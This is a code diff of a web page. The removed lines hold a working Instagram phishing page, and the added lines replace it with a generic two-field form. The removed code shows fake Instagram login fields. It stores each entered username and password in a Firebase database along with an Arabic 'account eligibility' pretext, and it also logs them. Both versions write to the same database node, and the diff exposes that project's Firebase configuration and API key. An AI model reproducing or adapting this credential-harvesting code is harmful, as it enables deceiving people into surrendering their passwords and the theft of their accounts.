@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Instagram Login</title>
+  <title>Firebase Form</title>
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -91,13 +91,12 @@
 <body>
   <div class="container">
     <div class="login-box">
-      <img src="Capture.PNG" alt="Instagram">
-      <form id="login-form">
-        <input type="text" id="username" placeholder="Username" required>
-        <input type="password" id="password" placeholder="Password" required>
-        <button type="submit">Log In</button>
+      <img src="Capture.PNG" alt="Capture">
+      <form id="dataForm">
+        <input type="text" id="field1" placeholder="Field 1" required>
+        <input type="text" id="field2" placeholder="Field 2" required>
+        <button type="submit">Submit</button>
       </form>
-      <div id="status-message"></div>
     </div>
     <div class="video-container">
       <video autoplay loop muted>
@@ -106,68 +105,50 @@
     </div>
   </div>
 
-  <!-- Add Firebase SDKs -->
-  <script src="https://www.gstatic.com/firebasejs/9.8.1/firebase-app.js"></script>
-  <script src="https://www.gstatic.com/firebasejs/9.8.1/firebase-database.js"></script>
+  <!-- Firebase SDK -->
+  <script src="https://www.gstatic.com/firebasejs/8.6.1/firebase-app.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/8.6.1/firebase-database.js"></script>
   <script>
-    document.addEventListener('DOMContentLoaded', () => {
-      console.log("DOM fully loaded and parsed");
+    // Your web app's Firebase configuration
+    const firebaseConfig = {
+      apiKey: "AIzaSyAK5RudP6qIPX8kUbHj3YdaMPERrmry5ns",
+      authDomain: "project-80357.firebaseapp.com",
+      databaseURL: "https://project-80357-default-rtdb.firebaseio.com",
+      projectId: "project-80357",
+      storageBucket: "project-80357.appspot.com",
+      messagingSenderId: "421768499139",
+      appId: "1:421768499139:web:5f8a0d50956a5cdeacb9a0"
+    };
 
-      const firebaseConfig = {
-        apiKey: "AIzaSyAK5RudP6qIPX8kUbHj3YdaMPERrmry5ns",
-        authDomain: "project-80357.firebaseapp.com",
-        databaseURL: "https://project-80357-default-rtdb.firebaseio.com",
-        projectId: "project-80357",
-        storageBucket: "project-80357.appspot.com",
-        messagingSenderId: "421768499139",
-        appId: "1:421768499139:android:edb967379229d1ac42b776"
-      };
+    // Initialize Firebase
+    firebase.initializeApp(firebaseConfig);
+    const database = firebase.database();
 
-      console.log("Initializing Firebase with config:", firebaseConfig);
+    // Form submission handling
+    document.getElementById('dataForm').addEventListener('submit', submitForm);
 
-      // Initialize Firebase
-      firebase.initializeApp(firebaseConfig);
-      const database = firebase.database();
-      const form = document.getElementById('login-form');
+    function submitForm(e) {
+      e.preventDefault();
 
-      if (form) {
-        form.addEventListener('submit', (event) => {
-          event.preventDefault();
-          console.log("Form submit event");
+      const field1 = document.getElementById('field1').value;
+      const field2 = document.getElementById('field2').value;
 
-          const username = document.getElementById('username').value;
-          const password = document.getElementById('password').value;
+      saveData(field1, field2);
+    }
 
-          if (username && password) {
-            console.log("Attempting to save credentials", { username, password });
-
-            // Generate a unique ID for each user
-            const userId = database.ref().child('book').push().key;
-
-            // Save the credentials to Firebase Realtime Database
-            database.ref('book/' + userId).set({
-              id: userId,
-              username: username,
-              password: password
-            }).then(() => {
-              console.log("Credentials saved successfully");
-              document.getElementById('status-message').textContent = 'تم تسجيل معلوماتك ستصلك رسالة اذا كان حسابك انستقرام مؤهل ستصلك رسالة نصية';
-              document.getElementById('login-form').reset();
-            }).catch((error) => {
-              console.error("Error saving credentials", error);
-              document.getElementById('status-message').textContent = 'Error saving credentials: ' + error.message;
-              // Redirect to a failure page
-              window.location.href = 'failure.html';
-            });
-          } else {
-            console.warn("Username or password not provided");
-            document.getElementById('status-message').textContent = 'Please fill in both fields.';
-          }
-        });
-      } else {
-        console.error("Form element not found");
-      }
-    });
+    function saveData(field1, field2) {
+      const newEntryKey = database.ref().child('book').push().key;
+      database.ref('book/' + newEntryKey).set({
+        field1: field1,
+        field2: field2
+      }, (error) => {
+        if (error) {
+          alert("Data could not be saved. " + error);
+        } else {
+          alert("Data saved successfully.");
+        }
+      });
+    }
   </script>
 </body>
 </html>
